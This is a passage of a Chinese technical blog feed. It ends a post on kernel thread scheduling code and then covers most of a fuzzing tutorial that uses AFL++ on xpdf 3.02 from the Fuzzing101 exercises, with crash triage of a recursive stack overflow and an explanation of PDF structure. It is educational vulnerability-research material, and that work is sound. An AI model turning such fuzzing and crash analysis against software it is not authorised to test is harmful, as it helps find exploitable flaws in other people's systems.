<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">thread_exit</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> (<span class="string">&quot;cli&quot;</span>);    <span class="comment">// 关中断</span></span><br><span class="line">    kernel_printf(<span class="string">&quot;\nThread finished!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记该线程已结束，等待回收</span></span><br><span class="line">    current_thread-&gt;state = THREAD_EXITED;</span><br><span class="line">    thread_remove(current_thread);</span><br><span class="line">    <span class="comment">// 回收线程栈</span></span><br><span class="line">    kfree(current_thread-&gt;<span class="built_in">stack</span>);</span><br><span class="line">    schedule(<span class="literal">NULL</span>);  <span class="comment">// 直接调度下一个线程</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);   <span class="comment">// 如果 schedule 没有返回，保险起见留个死循环</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">thread_remove</span><span class="params">(<span class="type">thread_t</span>* thread)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!thread || !ready_queue) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (thread-&gt;next == thread) &#123;</span><br><span class="line">        <span class="comment">// 只有一个线程在队列中</span></span><br><span class="line">        ready_queue = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 调整前后指针，断开 thread</span></span><br><span class="line">        thread-&gt;prev-&gt;next = thread-&gt;next;</span><br><span class="line">        thread-&gt;next-&gt;prev = thread-&gt;prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">(<span class="type">registers_t</span>* r)</span> &#123;     <span class="comment">// r: irq中断发生时保存的寄存器</span></span><br><span class="line">    <span class="keyword">asm</span> (<span class="string">&quot;cli&quot;</span>);</span><br><span class="line">    <span class="type">thread_t</span>* prev = current_thread;  <span class="comment">// 暂存旧线程指针</span></span><br><span class="line">    <span class="keyword">if</span> (!current_thread) &#123;</span><br><span class="line">        current_thread = ready_queue;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (current_thread-&gt;state == THREAD_RUNNING)&#123;</span><br><span class="line">            current_thread-&gt;state = THREAD_READY;</span><br><span class="line">            current_thread = current_thread-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(current_thread-&gt;state == THREAD_EXITED)&#123;</span><br><span class="line">            current_thread = current_thread-&gt;next;</span><br><span class="line">            prev-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            prev-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    current_thread-&gt;state = THREAD_RUNNING;</span><br><span class="line">    current_thread-&gt;time_slice = DEFAULT_SLICE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev&amp;&amp;prev-&gt;state!=THREAD_EXITED) </span><br><span class="line">        save_context(thread_get_context(prev),r);</span><br><span class="line">    load_context(thread_get_context(current_thread));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250608001955246.png"
                      class=""
                >
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>复杂程序fuzz初探</title>
    <url>/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="复杂程序fuzz初探">复杂程序fuzz初探</h2>
<h4 id="什么是fuzz">什么是fuzz</h4>
<p>Fuzz（Fuzzing，模糊测试）是一种<strong>自动化测试技术</strong>，用于发现程序中的漏洞或异常行为。它的核心思想是<strong>向程序输入大量随机、畸形（fuzzed）或异常的数据，观察程序的响应</strong>，以检测潜在的崩溃、内存泄漏、安全漏洞等问题。适用于<strong>二进制程序测试</strong>和<strong>Web
渗透测试</strong>。结合代码覆盖率分析和符号执行，现代 Fuzzing
工具能够高效发现程序中的安全漏洞，在
CTF、漏洞研究、软件测试等领域广泛应用。一个非常常用的工具是<strong>AFL++</strong>。</p>
<p>提到fuzz，我们经常听到另一个术语叫做<strong>插桩</strong>，插桩（Instrumentation）是一种<strong>在程序运行时插入额外代码</strong>的技术，主要用于：</p>
<ul>
<li><strong>监测代码覆盖率</strong></li>
<li><strong>记录执行路径</strong></li>
<li><strong>检测异常（如崩溃、内存错误）</strong></li>
</ul>
<p>AFL++ 主要通过<strong>编译时插桩</strong>来优化 Fuzzing
过程，比如：</p>
<ol type="1">
<li>在每个基本块（Basic Block）入口添加<strong>统计代码</strong>。</li>
<li>记录哪些路径已被执行。</li>
<li>反馈给 Fuzzing 引擎，生成更有效的输入数据。</li>
</ol>
<h4 id="afl安装">AFL++安装</h4>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus</span><br><span class="line"><span class="built_in">cd</span> AFLplusplus</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get install llvm clang</span><br><span class="line">make source-only</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div>
<p>编译方式如下，与gcc使用类似，这里可能会显示afl-gcc已经被移除了，那么我们可以换用<strong>afl-clang-fast</strong>进行编译。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250311121702148.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">afl-clang-fast fuzz.c -o fuzz</span><br></pre></td></tr></table></figure></div>
<p>然后我们需要准备输入和输出两个目录，输入目录里存</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> input </span><br><span class="line"><span class="built_in">mkdir</span> output</span><br><span class="line"><span class="built_in">cd</span> input</span><br></pre></td></tr></table></figure></div>
<h4 id="提升fuzz效率">提升fuzz效率</h4>
<p>但是这里我发现跑的速度极慢，11分钟才完成了242个testcase。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250329231524270.png"
                      class=""
                >
<p>这里我尝试了多进程一起跑，结果wsl直接炸盘。后面看了相关介绍才知道wsl性能差的原因。</p>
<p><strong>WSL 的 Fork 机制效率低</strong></p>
<ul>
<li>AFL++ 依赖 <strong><code>fork()</code></strong> 来创建新进程，但 WSL
的 <code>fork()</code> 性能 <strong>比原生 Linux
差几十倍</strong>，因为它底层用的是 Windows 的进程模型。</li>
<li><strong>影响</strong>：每次 AFL++ 运行新变异输入，都会导致 WSL 执行
<code>fork()</code>，使 fuzzing 速度极慢。</li>
</ul>
<p><strong>WSL I/O 性能较差</strong></p>
<ul>
<li><strong>AFL++ 需要频繁读取/写入测试用例文件</strong>，但 WSL
下的文件 I/O <strong>比原生 Linux 慢 10 倍以上</strong>（尤其是
<code>/mnt</code> 挂载 Windows 磁盘时）。</li>
<li><strong>影响</strong>：
<ul>
<li><code>exec speed</code> 变得很慢</li>
<li><code>cycles done</code> 进度很慢</li>
<li><code>timeouts</code> 过多</li>
</ul></li>
</ul>
<p><strong>WSL 不能直接访问裸机 CPU</strong></p>
<ul>
<li>WSL 运行在 <strong>Hyper-V
之上</strong>，但没有完整的虚拟化支持，所以：
<ul>
<li><strong>不能利用 CPU 的 fuzzing 相关优化指令</strong></li>
<li><strong><code>afl-fuzz</code> 可能不能充分利用 CPU
多核</strong></li>
<li><strong>性能远远低于裸机 Linux</strong></li>
</ul></li>
</ul>
<p>所以这里换用<strong>vmware</strong>来作为虚拟的环境。这里github项目给了一个<a class="link" 
 href="https://drive.google.com/file/d/1_m1x-SHcm7Muov2mlmbbt8nkrMYp0Q3K/view" >镜像<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。用户名为fuzz，密码为fuzz。</p>
<h4 id="fuzzing101例题复现">Fuzzing101例题复现</h4>
<p>项目地址：https://github.com/antonio-morales/Fuzzing101/</p>
<h5 id="exercise-1">Exercise 1</h5>
<h6 id="fuzz">fuzz</h6>
<p>环境准备：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="built_in">cd</span> fuzzing_xpdf/</span><br><span class="line"><span class="built_in">sudo</span> apt install build-essential</span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br><span class="line"><span class="built_in">cd</span> xpdf-3.02</span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt install -y build-essential gcc</span><br><span class="line">./configure --prefix=<span class="string">&quot;path/to/fuzzing_xpdf/install/&quot;</span>		</span><br><span class="line"><span class="comment">#prefix指定程序存放路径，注意prefix前面自己的路径里不能有空格，否则后面会截断</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>用export来暂时将我们装好的程序所在bin目录加入PATH环境变量，方便我们使用命令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=path/to/fuzzing_xpdf/install/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">which</span> pdfinfo  	<span class="comment">#检查是否加入环境变量成功</span></span><br></pre></td></tr></table></figure></div>
<p>然后可以找个目录下我们试用的pdf文件。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> pdf_examples &amp;&amp; <span class="built_in">cd</span> pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br><span class="line"></span><br><span class="line">pdfinfo -box -meta path/to/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br></pre></td></tr></table></figure></div>
<p>其中github教学中有个pdf的下载地址失效了，这里我自己写了个markdown文件转成pdf当作第三个输入种子用。内容是Test
seed pdf file here，2级标题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250329223749125.png"
                      class=""
                >
<p>实际上我们如果要结合<strong>afl++</strong>来测这个xpdf的程序的话，我们需要用<strong>afl-clang-fast</strong>来对其进行编译。我们需要先把前面下好的install删了，然后清空所有之前编译好的文件。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r install</span><br><span class="line"><span class="built_in">cd</span> xpdf-3.02</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-11&quot;</span></span><br><span class="line">CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=<span class="string">&quot;path/to/fuzzing_xpdf/install&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以把fuzzer跑起来了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i path/to/fuzzing_xpdf/pdf_examples -o path/to/fuzzing_xpdf/out/ -s 123 -- path/to/fuzzing_xpdf/install/bin/pdftotext @@ path/to/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure></div>
<p><strong>指令各部分拆解</strong></p>
<table>
<colgroup>
<col style="width: 41%" />
<col style="width: 58%" />
</colgroup>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>afl-fuzz</code></td>
<td>启动 AFL++ fuzz 测试工具</td>
</tr>
<tr>
<td><code>-i $HOME/fuzzing_xpdf/pdf_examples/</code></td>
<td>指定初始输入样本的目录，AFL++ 会从这里拿 PDF
文件作为初始种子输入</td>
</tr>
<tr>
<td><code>-o $HOME/fuzzing_xpdf/out/</code></td>
<td>指定 AFL++ 的输出目录，用于保存 fuzz
过程中的崩溃、超时、变异过的样本等</td>
</tr>
<tr>
<td><code>-s 123</code></td>
<td>指定 fuzzing 使用的随机种子（123），这样 fuzzing
的变异是可复现的，适合实验和调试</td>
</tr>
<tr>
<td><code>--</code></td>
<td>分隔符，告诉 AFL++，后面的都是被 fuzz 的目标程序及其参数</td>
</tr>
<tr>
<td><code>$HOME/fuzzing_xpdf/install/bin/pdftotext</code></td>
<td>被 fuzz 的目标程序，这里是 <code>pdftotext</code>，Xpdf 项目中的 PDF
转文本工具</td>
</tr>
<tr>
<td><code>@@</code></td>
<td>占位符，AFL++ 会在每次 fuzz 时自动用一个输入文件的路径替换
<code>@@</code></td>
</tr>
<tr>
<td><code>$HOME/fuzzing_xpdf/output</code></td>
<td><code>pdftotext</code> 的输出路径，转出来的文本会放到这里，不影响
fuzzing 行为，只是程序的正常参数</td>
</tr>
</tbody>
</table>
<p>可能会有如下报错：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250329230107885.png"
                      class=""
                >
<p>这说明 Linux 系统当前配置了
<code>core_pattern</code>，把崩溃的程序信息重定向到外部的 <strong>crash
handler</strong>（比如 <code>apport</code>,
<code>systemd-coredump</code>, <code>core_collector</code>
之类的工具）。</p>
<p>这会让 AFL++ 无法<strong>立即</strong>感知到目标程序崩溃，AFL++ 是靠
<code>waitpid()</code> 来实时感知崩溃的，但你现在系统的 core dump 是通过
pipe 发给了外部工具，导致 AFL++ 检测不到 crash，甚至误以为是
timeout。</p>
<p>临时关闭 core_pattern 的 pipe 重定向：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure></div>
<p>这样崩溃就会直接产出 core 文件，而不是送去外部工具，AFL++
就能正常检测到 crash 了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330174158039.png"
                      class=""
                >
<p>crash时的结果文件存在<strong>out/defalut/crashes</strong>中，我们可以选取一个样本，先确定是否能复现crash，具体来说就是用pdftotext再次跑一遍对应样本。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330174942595.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330175509457.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330175853671.png"
                      class=""
                >
<p>这里能看到崩溃时的调用栈，有样本是在执行getObject时崩溃的，也有样本发生了栈溢出（能看到函数调用栈深度来到了惊人的250）。</p>
<p>然后我们先来用pwndbg调试栈溢出的这个样本，首先是在<strong>call
PDFDoc</strong>时崩溃退出的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330224957022.png"
                      class=""
                >
<p>如果直接到崩溃点看内存映射以及寄存器，我们可以发现是rsp达到了stack段的起始位置，此时再次call一个函数就会超出可写的内存段，触发seg
fault。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330225423810.png"
                      class=""
                >
<p>然后跟进去，发现<strong>call
PDFDoc::setup</strong>会直接栈溢出崩溃，然后是<strong>call
Catalog::Catalog</strong>崩溃，然后是<strong>call
XRef::fetch</strong>崩溃。这样一直找也能逐渐找到漏洞所在点，其实我们如果观察之前fuzz时crashes结果直接扔<strong>pdftotext</strong>报错的结果，会发现栈溢出最后就是<strong>ObjectStream::ObjectStream</strong>与<strong>XRef::fetch</strong>反复互相调用导致的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330225904720.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250330230203787.png"
                      class=""
                >
<p>因为这里我们有程序的源码，所以我们可以看着关键源码分析，并看看能不能将bug修复。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">ObjectStream::<span class="built_in">ObjectStream</span>(XRef *xref, <span class="type">int</span> objStrNumA) &#123;</span><br><span class="line">  Stream *str;</span><br><span class="line">  Parser *parser;</span><br><span class="line">  <span class="type">int</span> *offsets;</span><br><span class="line">  Object objStr, obj1, obj2;</span><br><span class="line">  <span class="type">int</span> first, i;</span><br><span class="line"></span><br><span class="line">  objStrNum = objStrNumA;</span><br><span class="line">  nObjects = <span class="number">0</span>;</span><br><span class="line">  objs = <span class="literal">NULL</span>;</span><br><span class="line">  objNums = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!xref-&gt;<span class="built_in">fetch</span>(objStrNum, <span class="number">0</span>, &amp;objStr)-&gt;<span class="built_in">isStream</span>()) &#123;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!objStr.<span class="built_in">streamGetDict</span>()-&gt;<span class="built_in">lookup</span>(<span class="string">&quot;N&quot;</span>, &amp;obj1)-&gt;<span class="built_in">isInt</span>()) &#123;</span><br><span class="line">    obj<span class="number">1.f</span>ree();</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line">  ................</span><br><span class="line"> err1:</span><br><span class="line">  objStr.<span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Object *<span class="title">XRef::fetch</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> gen, Object *obj)</span> </span>&#123;</span><br><span class="line">  XRefEntry *e;</span><br><span class="line">  Parser *parser;</span><br><span class="line">  Object obj1, obj2, obj3;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check for bogus ref - this can happen in corrupted PDF files</span></span><br><span class="line">  <span class="keyword">if</span> (num &lt; <span class="number">0</span> || num &gt;= size) &#123;</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  e = &amp;entries[num];</span><br><span class="line">  <span class="keyword">switch</span> (e-&gt;type) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> xrefEntryUncompressed:</span><br><span class="line">	.................</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> xrefEntryCompressed:</span><br><span class="line">    <span class="keyword">if</span> (gen != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!objStr || objStr-&gt;<span class="built_in">getObjStrNum</span>() != (<span class="type">int</span>)e-&gt;offset) &#123;</span><br><span class="line">      <span class="keyword">if</span> (objStr) &#123;</span><br><span class="line">	<span class="keyword">delete</span> objStr;</span><br><span class="line">      &#125;</span><br><span class="line">      objStr = <span class="keyword">new</span> <span class="built_in">ObjectStream</span>(<span class="keyword">this</span>, e-&gt;offset);				<span class="comment">// here</span></span><br><span class="line">    &#125;</span><br><span class="line">    objStr-&gt;<span class="built_in">getObject</span>(e-&gt;gen, num, obj);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  <span class="keyword">return</span> obj-&gt;<span class="built_in">initNull</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中Object类的一些类型的判断是通过type字段实现的。当
<code>Type</code> 为 <code>ObjStream</code> 时，表示该对象是
<strong>对象流（Object Stream）</strong>。对象流是 PDF 1.5
引入的一种优化机制，目的是减少 PDF 文档的大小和提高解析效率。</p>
<p>对象流的主要特征：</p>
<ol type="1">
<li><strong>存储压缩对象</strong>：对象流用于存储多个 PDF
对象（通常是小型的、非结构化的 PDF 对象，如字典和数组）。</li>
<li><strong>被压缩存储</strong>：通常使用 FlateDecode（基于 zlib
的压缩算法）进行压缩。</li>
<li><strong>非直接引用</strong>：被包含在对象流中的对象不会在 xref
表中单独列出，而是由 <code>ObjStm</code> 统一管理。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250401111738980.png"
                      class=""
                >
<h6 id="pdf结构介绍">pdf结构介绍</h6>
<p>这里我们可以先了解一下pdf的文件结构，以前面的<strong>helloworld.pdf</strong>为例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%PDF-1.7</span><br><span class="line"></span><br><span class="line">1 0 obj  % entry point</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Catalog</span><br><span class="line">  /Pages 2 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Pages</span><br><span class="line">  /MediaBox [ 0 0 200 200 ]</span><br><span class="line">  /Count 1</span><br><span class="line">  /Kids [ 3 0 R ]</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">3 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Page</span><br><span class="line">  /Parent 2 0 R</span><br><span class="line">  /Resources &lt;&lt;</span><br><span class="line">    /Font &lt;&lt;</span><br><span class="line">      /F1 4 0 R </span><br><span class="line">    &gt;&gt;</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  /Contents 5 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Font</span><br><span class="line">  /Subtype /Type1</span><br><span class="line">  /BaseFont /Times-Roman</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj  % page content</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Length 44</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">70 50 TD</span><br><span class="line">/F1 12 Tf</span><br><span class="line">(Hello, world!) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line">0 6</span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000010 00000 n </span><br><span class="line">0000000079 00000 n </span><br><span class="line">0000000173 00000 n </span><br><span class="line">0000000301 00000 n </span><br><span class="line">0000000380 00000 n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Size 6</span><br><span class="line">  /Root 1 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">492</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure></div>
<p><strong>1. 头部（Header）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%PDF-1.7</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>PDF-1.7</code>：表明该 PDF 使用 <strong>PDF 1.7 版本</strong>
规范。</li>
<li><strong>注意</strong>：有些 PDF
在此之后会加上一行二进制数据，以避免文本编辑器错误处理 PDF。</li>
</ul>
<p><strong>2. 对象（Body）</strong></p>
<p><strong>2.1 根目录对象 (<code>Catalog</code>)</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 0 obj  % entry point</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Catalog</span><br><span class="line">  /Pages 2 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>对象 ID：</strong> <code>1 0 obj</code></li>
<li><strong><code>/Type /Catalog</code></strong>：表明这是 PDF 的
<strong>根目录对象</strong>（<code>Catalog</code>）。</li>
<li><strong><code>/Pages 2 0 R</code></strong>：指向
<strong>页面树对象</strong> <code>2 0 obj</code>，用于管理 PDF
页面。</li>
</ul>
<p><strong>2.2 页面树对象 (<code>Pages</code>)</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Pages</span><br><span class="line">  /MediaBox [ 0 0 200 200 ]</span><br><span class="line">  /Count 1</span><br><span class="line">  /Kids [ 3 0 R ]</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>对象 ID：</strong> <code>2 0 obj</code></li>
<li><strong><code>/Type /Pages</code></strong>：标明它是
<strong>页面集合</strong>，用于管理 PDF 页面。</li>
<li><strong><code>/MediaBox [ 0 0 200 200 ]</code></strong>：
<ul>
<li>定义 <strong>页面大小</strong>（单位：PostScript Points，1pt ≈ 1/72
英寸）。</li>
<li><code>(0,0)</code> 是左下角，<code>(200,200)</code> 是右上角。</li>
</ul></li>
<li><strong><code>/Count 1</code></strong>：表示这个 PDF 只有 <strong>1
页</strong>。</li>
<li><strong><code>/Kids [ 3 0 R ]</code></strong>：
<ul>
<li>该数组存储了 PDF <strong>页面对象</strong>的引用，这里只有
<code>3 0 obj</code>（即唯一的页面）。</li>
</ul></li>
</ul>
<p><strong>2.3 页面对象 (<code>Page</code>)</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Page</span><br><span class="line">  /Parent 2 0 R</span><br><span class="line">  /Resources &lt;&lt;</span><br><span class="line">    /Font &lt;&lt;</span><br><span class="line">      /F1 4 0 R </span><br><span class="line">    &gt;&gt;</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  /Contents 5 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>对象 ID：</strong> <code>3 0 obj</code></li>
<li><strong><code>/Type /Page</code></strong>：标明它是
<strong>页面对象</strong>。</li>
<li><strong><code>/Parent 2 0 R</code></strong>：指向 <strong>父级
<code>Pages</code> 对象</strong> <code>2 0 obj</code>。</li>
<li><strong><code>/Resources</code></strong>：
<ul>
<li><strong>存储该页面的资源信息（如字体、图片等）。</strong></li>
<li><code>/Font &lt;&lt; /F1 4 0 R &gt;&gt;</code>：
<ul>
<li>定义了字体资源，<code>F1</code> 代表该页面的
<strong>字体名称</strong>，实际引用
<code>4 0 obj</code>（字体对象）。</li>
</ul></li>
